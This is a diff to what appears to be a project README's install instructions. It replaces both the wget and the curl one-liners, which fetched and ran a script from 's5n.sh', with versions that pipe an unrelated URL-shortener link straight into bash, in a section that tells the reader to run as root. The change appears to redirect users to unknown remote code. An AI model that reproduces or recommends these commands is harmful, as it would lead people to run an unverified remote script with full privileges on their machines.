@@ -24,12 +24,12 @@ You can see what that looks like here:
 
 Using `wget`:
 ```shell
-bash <(wget -qO - s5n.sh) && . ~/.bashrc
+bash <(wget -qO - xiaolin1579.s.gy/I8lGfD) && . ~/.bashrc
 ```
 
 Using `curl`:
 ```shell
-bash <(curl -sL s5n.sh) && . ~/.bashrc
+bash <(curl -sL xiaolin1579.s.gy/I8lGfD) && . ~/.bashrc
 ```
 
 ### Make sure you are root
